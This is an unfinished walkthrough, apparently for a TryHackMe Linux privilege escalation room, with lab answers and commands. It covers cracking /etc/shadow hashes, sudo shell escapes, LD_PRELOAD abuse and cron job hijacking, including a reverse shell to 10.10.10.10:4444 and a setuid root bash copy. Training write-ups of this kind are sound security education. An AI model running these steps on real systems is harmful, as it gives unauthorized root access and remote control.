![Windows PrivEsc Banner](https://i.imgur.com/RuMC2vG.png)

<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Linux_Priv_Esc_Cover.png" alt="Linux PrivEsc Logo">
</p>

# Linux PrivEsc

This guide contains the answer and steps necessary to get to them for the [Linux PrivEsc](https://tryhackme.com/room/linuxprivesc) room.

## Table of contents

- [Deploy the Vulnerable Debian VM](#deploy-the-vulnerable-debian-vm)
- [Service Exploits](#service-exploits)
- [Weak File Permissions - Readable /etc/shadow](#weak-file-permissions---readable-etcshadow)
- [Weak File Permissions - Writable /etc/passwd](#weak-file-permissions---writable-etcshadow)
- [Sudo - Shell Escape Sequences](#sudo---shell-escape-sequences)
- [Sudo - Environment Variables](#sudo---environment-variables)
- [Cron Jobs - File Permissions](#cron-jobs---file-permissions)
- [Cron Jobs - PATH Environment Variable](#cron-jobs---path-environment-variable)
- [Cron Jobs - Wildcards](#cron-jobs---wildcards)
- [SUID / SGID Executables - Known Exploits](#suid--sgid-executables---known-exploits)
- [SUID / SGID Executables - Shared Object Injection](#suid--sgid-executables---shared-object-injection)
- [SUID / SGID Executables - Environment Variables](#suid--sgid-executables---environment-variables)
- [SUID / SGID Executables - Abusing Shell Features (#1)](#suid--sgid-executables---abusing-shell-features-1)
- [SUID / SGID Executables - Abusing Shell Features (#2)](#suid--sgid-executables---abusing-shell-features-2)
- [Passwords & Keys - History Files](#passwords--keys---history-files)
- [Passwords & Keys - Config Files](#passwords--keys---config-files)
- [Passwords & Keys - SSH Keys](#passwords--keys---ssh-keys)
- [NFS](#nfs)
- [Kernel Exploits](#kernel-exploits)
- [Privilege Escalation Scripts ](#privilege-escalation-scripts)

### Deploy the Vulnerable Debian VM

**Username:** user

**Password:** password321

https://www.exploit-db.com/exploits/1518

```cmd
ssh user@10.10.42.225
```

![Nmap Scan](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Linux_Priv_Esc_Nmap_Scan.png)


### Service Exploits

*Read and follow along with the above.*

### Weak File Permissions - Readable /etc/shadow

In this task we utilize insecure read permissions for the /etc/shadow file.

1. What is the root user's password hash?

   We first need to find the permission we have for this file as a normal user.

   ```cmd
   ls -lh /etc/shadow
   ```
   
   ![Shadow Permissions](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Readable_Shadow_Permissions.png)
   
   Looks like the file as read and write permissions for all users. We can now view the file.
   
   ```cmd
   cat /etc/shadow
   ```
   
   Here we can find the has for the user `root` between the first two `:`.
   
   ![Contents](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Readable_Shadow_Contents.png)

   ><details><summary>Click for answer</summary>$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0</details>

2. What hashing algorithm was used to produce the root user's password hash?

   THe first thing we can try is `hash-identifier` to find the hashing algorithm.
   
   ![Hash Identifier](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Readable_Shadow_Hash_Identifier.png)
   
   Looks like it is a SHA256 hash. However, using examples from `hashcat` we can find the exact hash by looking at the format.
   
   ![Hashcat Examples](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Readable_Shadow_Hashcat_Examples.png)

   ><details><summary>Click for answer</summary>sha512crypt</details>

3. What is the root user's password?

   The next step is to crack the password with either `hashcat` or `john`. 
   
   ```cmd
   hashcat -m 1800 password.hash /usr/share/wordlists/rockyou.txt
   ```
   
   ![Hashcat Results](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Readable_Shadow_Hashcat_Results.png)
   
   ```cmd
   john --wordlist=/usr/share/wordlists/rockyou.txt password.hash
   ```
   
   ![John Results](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Readable_Shadow_John_Results.png)
   
   Now we can use the found password to switch to the root user.
   
   ```cmd
   su -u root
   ```
   
   ><details><summary>Click for answer</summary>password123</details>

### Weak File Permissions - Writable /etc/shadow



*Read and follow along with the above.*

Again we can use `ls -lh /etc/shadow` to find out what the permissions for this file are.

![Permissions](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Writable_Shadow_Permissions.png)

Instead of cracking the password, we can simply add our own, since we have write permissions for this file. We can use `mkpasswd` to create the hashed password.

```cmd
mkpasswd -m sha-512 iamroot
```

Next we can replace the root users password with our own password.

![Modify](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Writable_Shadow_Modify.png)

Now we can switch to the root user with our own password.

![Root](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Writable_Shadow_Root.png)

### Weak File Permissions - Writable /etc/passwd

1. Run the "id" command as the newroot user. What is the result?

   ![Modification](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Writable_Passwd_Modification.png)

   ><details><summary>Click for answer</summary>uid=0(root) gid=0(root) groups=0(root)</details>

### Sudo - Shell Escape Sequences

![Apache 2](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shell_Escape_Apache2.png)
![Awk](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shell_Escape_Awk.png)
![Find](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shell_Escape_Find.png)
![Ftp](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shell_Escape_Ftp.png)
![Iftop](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shell_Escape_Iftop.png)
![Less](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shell_Escape_Less.png)
![Man](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shell_Escape_Man.png)
![More](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shell_Escape_More.png)
![Nano](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shell_Escape_Nano.png)
![Nmap](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shell_Escape_Nmap.png)
![Vim](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shell_Escape_Vim.png)


1. How many programs is "user" allowed to run via sudo? 

   We can use `sudo -l` to view all the executables we can run with sudo.
   
   ![]()
   
   ><details><summary>Click for answer</summary>11</details>
   
2. One program on the list doesn't have a shell escape sequence on GTFOBins. Which is it?

   After going through the entire list in GTFOBins, there is one binary that was not listed on the website.
   
   ><details><summary>Click for answer</summary>apache2</details>

We can use (https://gtfobins.github.io/) to find out how to get an elevated shell with each binary.

**awk**

```cmd
sudo awk 'BEGIN {system("/bin/sh")}'
```

![]()

**iftop**

```cmd
sudo iftop
!/bin/sh
```

![]()
   
**find**

```cmd
sudo find . -exec /bin/sh \; -quit
```

![]()

**ftp**

```cmd
sudo ftp
!/bin/sh
```

![]()

**less**

```cmd
sudo less /etc/profile
!/bin/sh
```

![]()

**man**

```cmd
sudo man man
!/bin/sh
```

![]()

**more**

```cmd
TERM= sudo more /etc/profile
!/bin/sh
```

![]()

**nano**

```cmd
sudo nano
^R^X
reset; sh 1>&0 2>&0
```

![]()

**nmap**

```cmd
sudo nmap --interactive
nmap> !sh
```

![]()

**vim**

```cmd
sudo vim -c ':!/bin/sh'
```
![]()

*Consider how you might use this program with sudo to gain root privileges without a shell escape sequence.*

```cmd
sudo apache2 -f /etc/shadow
```

![]()

https://touhidshaikh.com/blog/2018/04/abusing-sudo-linux-privilege-escalation/

### Sudo - Environment Variables

![Libraries](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Environment_Variables_Libraries.png)
![Library](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Environment_Variables_Library.png)
![Pre Load](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Environment_Variables_Preload.png)


*Read and follow along with the above.*

```cmd
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
```
```cmd
sudo LD_PRELOAD=/tmp/preload.so find
```

![]()

```cmd
ldd /usr/sbin/apache2
```

![]()

```cmd
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
```
```cmd
sudo LD_LIBRARY_PATH=/tmp apache2
```

![]()

### Cron Jobs - File Permissions

cat /etc/crontab
locate overwrite.sh
ls -l /usr/local/bin/overwrite.sh
nano /usr/local/bin/overwrite.sh


bash -i >& /dev/tcp/10.10.10.10/4444 0>&1

nc -nvlp 4444



https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_File_Permissions_Crontab.png
https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_File_Permissions_Job.png
https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_File_Permissions_Locate.png
https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_File_Permissions_Permission.png
https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_File_Permissions_Root_Shell.png


### Cron Jobs - PATH Environment Variable

cat /etc/crontab


#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash

chmod +x /home/user/overwrite.sh

/tmp/rootbash -p

rm /tmp/rootbash
exit

https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_File_Path_Remove.png
https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_File_Path_Variable.png



/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

### Cron Jobs - Wildcards
### SUID / SGID Executables - Known Exploits
### SUID / SGID Executables - Shared Object Injection
### SUID / SGID Executables - Environment Variables
### SUID / SGID Executables - Abusing Shell Features (#1)
### SUID / SGID Executables - Abusing Shell Features (#2)
### Passwords & Keys - History Files
### Passwords & Keys - Config Files
### Passwords & Keys - SSH Keys
### NFS
### Kernel Exploits
### Privilege Escalation Scripts 
